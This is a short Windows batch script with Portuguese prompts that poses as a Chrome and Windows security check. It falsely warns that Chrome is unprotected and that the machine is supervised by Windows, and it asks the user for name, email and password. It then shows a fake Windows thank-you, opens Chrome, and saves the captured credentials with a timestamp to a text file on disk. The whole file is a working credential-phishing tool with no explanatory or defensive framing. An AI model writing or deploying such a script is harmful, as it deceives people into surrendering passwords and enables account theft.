@echo off

title Chrome

cls
echo.
echo -O Chrome nao esta protegido!

echo.

echo -Confirme seus dados para provar que e voce.
echo.
echo -Esta maquina esta sendo supervisionada pelo windows.
echo.

set /p nome=Nome:
set /p us=Email:
set /p pass=Senha:



cls
title AVISO
color f0
@echo.
@echo      * Windows agradece, agora voce ja pode utilizar seu navegador! *
@echo.
pause

start Chrome
Start chrome /incognito
start chrome www.windows.com
echo Dia %date% Hora %time% %n% Nome: %nome% Email: %us% Senha: %pass%  >"c:\bat\%n%.txt"
ping locallhost -n 2 >nul

exit